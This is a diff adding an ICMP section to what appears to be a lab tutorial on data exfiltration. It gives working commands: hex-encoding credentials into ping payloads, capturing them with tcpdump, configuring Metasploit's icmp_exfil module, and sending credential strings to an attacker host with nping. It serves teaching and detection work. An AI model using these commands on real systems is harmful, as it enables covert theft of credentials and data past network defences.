@@ -91,3 +91,87 @@ We found the files inside the attacker's machine.
 </p>
 
 ## ICMP Protocol
+
+The ICMP stands for Internet Control Message Protocol, and it is a network layer protocol used to handle error reporting. Network devices such as routers use ICMP protocol to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices.
+
+#### ICMP Data Section
+
+Data exfiltration is possible due to the structure of the ICMP protocol. In this protocol, there is an 'Optional Data' field, which we use to send the data.
+
+<p align="center">
+  <img width="600" height="200" src="./img/9.jpg">
+</p>
+
+* In this first step, we will encode our text to HEX, avoiding any encoding problems when sending the ICMP protocol. To identify the data sent in the protocol, we will use the **TCPDUMP network analyzer**.
+
+```
+echo "root:pass321" | xxd -p 
+726f6f743a706173733332310a
+```
+1. we convert the string to HEX with xxd
+
+Let's test the protocol between 2 machines. On the victim's host, we send the ping with the text converted to HEX.
+```
+ping 192.168.0.133 -c1 -p 726f6f743a706173733332310a
+```
+
+<p align="center">
+  <img width="800" height="200" src="./img/10.jpg">
+</p>
+
+On the attacker's host, we need to monitor the ICMP protocol on the network with tcpdump, using -X to show the data field, -i for interface and the protocol (ICMP).
+```
+tcpdump -X -i eth1 icmp
+```
+<p align="center">
+  <img width="800" height="300" src="./img/11.jpg">
+</p>
+
+#### ICMP and Metasploit
+
+To facilitate and automate the process with ICMP, the metasploit framework has a module to help us receive this data, called **icmp_exfil**.
+
+```
+msf6 > use auxiliary/server/icmp_exfil 
+msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKER-IP
+BPF_FILTER => icmp and not src ATTACKER-IP
+msf6 auxiliary(server/icmp_exfil) > set INTERFACE eth0
+INTERFACE => eth0
+msf6 auxiliary(server/icmp_exfil) > run
+```
+After configuring the module, we need to send a signal to the attacking host to start receiving data via ICMP. This signal is the text "BOFfile.txt" via ICMP.
+
+```
+nping --icmp -c 1 ATTACKER-IP --data-string "BOFfile.txt"
+```
+* The victim host sends the signal.
+<p align="center">
+  <img width="800" height="150" src="./img/12.jpg">
+</p>
+* The attacking host receiving the signal.
+<p align="center">
+  <img width="800" height="100" src="./img/13.jpg">
+</p>
+
+Let's start our data exfiltration via ICMP. In the victim, we send some data;
+
+```
+nping --icmp -c 1 10.10.61.247 --data-string "admin:password"
+nping --icmp -c 1 10.10.61.247 --data-string "jorge@gmail.com:asdaf@#"
+nping --icmp -c 1 10.10.61.247 --data-string "jorge:xxssdaf@#"
+nping --icmp -c 1 10.10.61.247 --data-string "EOF"  -- To close the file
+```
+After EOF, the file is saved and we can view the data being sent via ICMP.
+
+<p align="center">
+  <img width="800" height="150" src="./img/14.jpg">
+</p>
+
+The exfiltrated data.
+<p align="center">
+  <img width="900" height="90" src="./img/15.jpg">
+</p>
+
+## DNS
+
+Working...
